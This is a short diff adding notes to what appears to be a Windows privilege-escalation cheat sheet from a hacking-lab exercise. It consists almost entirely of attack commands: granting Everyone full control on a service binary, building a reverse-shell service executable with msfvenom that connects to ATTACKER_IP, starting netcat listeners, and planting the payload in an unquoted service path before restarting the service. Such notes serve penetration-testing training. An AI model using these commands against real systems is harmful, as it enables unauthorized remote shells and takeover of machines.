@@ -42,3 +42,22 @@ icacls WService.exe /grant Everyone:F
 nc -lvp 4445
 sc stop windowsscheduler
 sc start windowsscheduler
+
+Unquoted Service Paths
+sc qc "vncserver"
+sc qc "disk sorter enterprise"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+nc -lvp 4446
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+C:\> sc stop "disk sorter enterprise"
+C:\> sc start "disk sorter enterprise"
+
+
+
+
+
+
+
+
+
+
